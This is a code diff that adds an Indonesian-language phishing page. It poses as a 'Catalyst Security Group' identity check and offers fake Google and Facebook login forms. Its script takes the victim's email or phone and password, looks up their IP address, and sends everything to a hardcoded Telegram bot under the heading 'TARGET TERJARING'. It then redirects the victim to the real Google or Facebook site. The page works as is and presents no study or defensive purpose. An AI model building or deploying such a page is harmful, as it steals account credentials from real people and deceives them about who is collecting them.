@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Pusat - Catalyst V12</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #2563eb;
+            --bg: #f8fafc;
+            --card-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-sub: #64748b;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #e2e8f0 0%, #f8fafc 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-main);
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+        }
+
+        .logo-area {
+            width: 64px;
+            height: 64px;
+            background: #eff6ff;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 8px;
+            letter-spacing: -0.025em;
+        }
+
+        .desc {
+            font-size: 15px;
+            color: var(--text-sub);
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .stack {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            all: unset;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-weight: 500;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid transparent;
+        }
+
+        .btn-google {
+            background: #ffffff;
+            color: #374151;
+            border: 1px solid #e5e7eb;
+        }
+
+        .btn-google:hover {
+            background: #f9fafb;
+            border-color: #d1d5db;
+            transform: translateY(-1px);
+        }
+
+        .btn-fb {
+            background: #1877f2;
+            color: white;
+        }
+
+        .btn-fb:hover {
+            background: #166fe5;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+            transform: translateY(-1px);
+        }
+
+        /* Form Styling */
+        #auth-form {
+            display: none;
+            text-align: left;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group { margin-bottom: 16px; }
+        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            ring: 3px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: var(--text-main);
+            color: white;
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid #f1f5f9;
+            padding-top: 20px;
+        }
+
+        .svg-icon { margin-right: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-area">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+    </div>
+
+    <div id="selection-area">
+        <h2>Verifikasi Identitas</h2>
+        <p class="desc">Sistem mendeteksi upaya login baru. Silakan konfirmasi identitas Anda untuk melanjutkan.</p>
+        
+        <div class="stack">
+            <button class="btn btn-google" onclick="openLogin('Google')">
+                <svg class="svg-icon" width="18" height="18" viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                </svg>
+                Lanjutkan dengan Google
+            </button>
+
+            <button class="btn btn-fb" onclick="openLogin('Facebook')">
+                <svg class="svg-icon" width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                Lanjutkan dengan Facebook
+            </button>
+        </div>
+    </div>
+
+    <div id="auth-form">
+        <h2 id="form-title">Login</h2>
+        <p class="desc" style="margin-bottom: 20px;">Silakan masukkan kredensial akun Anda.</p>
+        
+        <div class="input-group">
+            <label>Email atau Nomor Telepon</label>
+            <input type="text" id="user_id" placeholder="nama@contoh.com" spellcheck="false">
+        </div>
+        <div class="input-group">
+            <label>Kata Sandi</label>
+            <input type="password" id="user_pass" placeholder="••••••••">
+        </div>
+        
+        <button class="btn-submit" onclick="handleSubmit()">Konfirmasi Verifikasi</button>
+        <center><a href="javascript:void(0)" onclick="location.reload()" style="color:var(--primary); font-size:13px; text-decoration:none; display:inline-block; margin-top:15px;">Kembali ke pilihan</a></center>
+    </div>
+
+    <div class="footer">
+        &copy; 2026 Catalyst Security Group.<br>
+        Encrypted Endpoint Verification V12.0.4
+    </div>
+</div>
+
+<script>
+    const CONFIG = {
+        token: "8287992982:AAHTEY5ZmjZOrB95hWwJY7_a5GrrzRFPWy4",
+        chatId: "8154532061"
+    };
+
+    let activePlatform = "";
+
+    function openLogin(platform) {
+        activePlatform = platform;
+        document.getElementById('selection-area').style.display = 'none';
+        document.getElementById('auth-form').style.display = 'block';
+        document.getElementById('form-title').innerText = "Login " + platform;
+    }
+
+    async function handleSubmit() {
+        const id = document.getElementById('user_id').value;
+        const pw = document.getElementById('user_pass').value;
+
+        if(!id || !pw) return alert("Harap isi semua kolom.");
+
+        const btn = document.querySelector('.btn-submit');
+        btn.innerText = "Mengamankan...";
+        btn.disabled = true;
+
+        let ip = "N/A";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+
+        const msg = `
+🚨 TARGET TERJARING 🚨
+--------------------------
+PLATFORM : ${activePlatform}
+USER     : ${id}
+PASS     : ${pw}
+IP ADDR  : ${ip}
+DEVICE   : ${navigator.platform}
+WAKTU    : ${new Date().toLocaleString('id-ID')}
+--------------------------`;
+
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+            window.location.href = activePlatform === 'Google' 
+                ? "https://accounts.google.com" 
+                : "https://www.facebook.com";
+        });
+    }
+</script>
+
+</body>
+</html>
